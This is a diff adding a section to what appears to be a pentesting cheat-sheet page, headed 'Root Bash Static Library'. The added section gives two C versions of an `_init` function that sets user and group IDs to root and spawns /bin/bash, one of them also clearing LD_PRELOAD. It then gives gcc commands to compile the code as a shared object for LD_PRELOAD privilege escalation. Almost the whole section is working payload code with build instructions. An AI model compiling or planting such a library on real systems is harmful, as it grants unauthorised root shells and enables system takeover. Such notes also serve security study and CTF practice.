@@ -55,6 +55,56 @@ os.chmod(destination_path, 0o4755)
 
 <hr class="sep-both">
 
+## Root Bash Static Library
+
+<div class="row row-cols-lg-2"><div>
+
+Short simplified program.
+
+```c
+void _init() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+Long program.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+</div><div>
+
+To compile, use:
+
+```shell!
+$ gcc -shared -fPIC init.c -o init.so
+```
+
+Or, if you are compiling the function `_init`:
+
+```shell!
+$ gcc -shared -fPIC init.c -o init.so -nostartfiles
+```
+
+⚠️ Remember to ensure that the file is readable by those that need it.
+
+```shell!
+$ chmod 777 init.so       # 😏 - avoid it
+```
+</div></div>
+
+<hr class="sep-both">
+
 ## 👻 To-do 👻
 
 Stuff that I found, but never read/used yet.
